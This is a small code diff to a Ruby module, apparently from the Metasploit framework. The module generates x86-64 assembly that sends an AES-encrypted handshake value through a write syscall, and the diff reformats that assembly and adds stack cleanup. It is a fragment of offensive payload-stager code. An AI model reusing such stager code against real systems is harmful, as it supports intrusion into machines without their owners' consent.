@@ -15,24 +15,28 @@ module Msf
       magic += Aes256.encrypt_aes256(opts[:iv], opts[:key], iconn)
 
       asm = %^
-        send_magic:
-          xor    rax, rax
-          mov    al, 0x01
-        ^
+      send_magic:
+        xor    rax, rax
+        mov    al, 0x01^
       magic.reverse.bytes.each_slice(8) do |word|
         asm << %^
-          mov rbx, 0x#{word.pack('C*').unpack('H*')[0]}
-          push   rbx
-        ^
+        mov rbx, 0x#{word.pack('C*').unpack('H*')[0]}
+        push   rbx^
       end
 
       asm << %^
-          mov    dl, 0x#{'%02x' % magic.length}
-          xor    rdi, rdi
-          mov    rsi, rsp
-          syscall
-          xor    rdx, rdx
-          xor    rsi, rsi
+        mov    dl, 0x#{'%02x' % magic.length}
+        xor    rdi, rdi
+        mov    rsi, rsp
+        syscall^
+      
+      magic.reverse.bytes.each_slice(8) do |word|
+        asm << %^
+        pop r14^
+      end
+
+      asm << %^
+        xor    r14, r14
         ^
       asm
     end
